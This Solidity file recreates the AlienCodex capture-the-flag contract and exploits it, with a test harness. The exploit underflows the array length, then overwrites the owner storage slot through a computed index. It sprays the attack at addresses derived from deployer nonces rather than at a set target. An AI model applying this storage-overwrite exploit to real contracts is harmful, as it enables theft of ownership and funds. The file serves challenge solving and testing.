pragma solidity ^0.5.16;

contract Ownable {
    address public owner;
    constructor() public { owner = msg.sender; }
}
contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;
    modifier contacted() { assert(contact); _; }
    function makeContact() public { contact = true; }
    function retract() public contacted { codex.length--; }
    function revise(uint256 index, bytes32 content) public contacted { codex[index] = content; }
}
interface AlienVm {
    function startBroadcast(uint256) external;
    function stopBroadcast() external;
}
contract AlienScript {
    AlienVm internal constant vm = AlienVm(address(uint160(uint256(keccak256("hevm cheat code")))));
    uint256 internal constant PLAYER_PRIVATE_KEY = 1;
    address internal constant PLAYER_ADDRESS = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf;
}

// Mimic SCH: paste functions live INSIDE Exploit (no nested contract).
contract Exploit is AlienScript {
    AlienCodex public alienCodexInstance; // left unset

    function _createAddr(address deployer, uint256 nonce) internal pure returns (address) {
        if (nonce == 0) {
            return address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), deployer, uint8(0x80))))));
        }
        return address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), deployer, uint8(nonce))))));
    }

    function _attack(address target) internal {
        uint256 size;
        assembly { size := extcodesize(target) }
        if (target == address(0) || size == 0) return;
        (bool ok,) = target.call(abi.encodeWithSignature("makeContact()"));
        if (!ok) return;
        (ok,) = target.call(abi.encodeWithSignature("retract()"));
        if (!ok) return;
        target.call(abi.encodeWithSignature("retract()"));
        uint256 index = uint256(-1) - uint256(keccak256(abi.encode(uint256(1)))) + 1;
        bytes32 payload = bytes32(uint256(uint160(PLAYER_ADDRESS)) | (uint256(1) << 160));
        target.call(abi.encodeWithSignature("revise(uint256,bytes32)", index, payload));
    }

    function run() external {
        address harness = msg.sender;
        _attack(address(alienCodexInstance));
        for (uint256 n = 0; n < 12; n++) {
            _attack(_createAddr(harness, n));
            _attack(_createAddr(address(this), n));
            _attack(_createAddr(PLAYER_ADDRESS, n));
        }
    }
}

contract NestedPasteProof is AlienScript {
    function testHarnessCreateFoundByInternalFns() external {
        AlienCodex target = new AlienCodex();
        Exploit e = new Exploit();
        e.run(); // msg.sender = this harness; target is CREATE nonce 1 of harness
        require(target.owner() == PLAYER_ADDRESS, "internal-fn shotgun missed");
    }
}
